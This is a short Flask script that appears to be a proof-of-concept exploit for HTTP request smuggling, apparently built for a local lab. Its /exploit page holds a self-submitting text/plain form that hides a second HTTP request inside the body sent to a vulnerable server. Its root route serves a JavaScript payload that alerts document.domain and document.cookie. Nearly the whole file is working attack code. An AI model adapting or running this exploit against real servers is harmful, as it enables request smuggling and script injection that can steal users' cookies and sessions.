from flask import Flask, Response

app = Flask(__name__)

@app.route("/")
def index():
    resp = Response("alert(document.domain); alert(document.cookie)")
    resp.headers["Content-Type"] = "text/plain"
    return resp

@app.route("/exploit")
def exploit():
    expl_server = "http://127.0.0.1:5000" # no slash is important to make it works
    vuln_server = "http://127.0.0.1:5001/"
    return """
    <form id="x" action="%s"
    method="POST"
    enctype="text/plain">
    <textarea name="GET %s HTTP/1.1
    Foo: x">Mizu</textarea>
    <button type="submit">CLICK ME</button>
    </form>

    <script> x.submit() </script>
    """ % (vuln_server, expl_server)

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
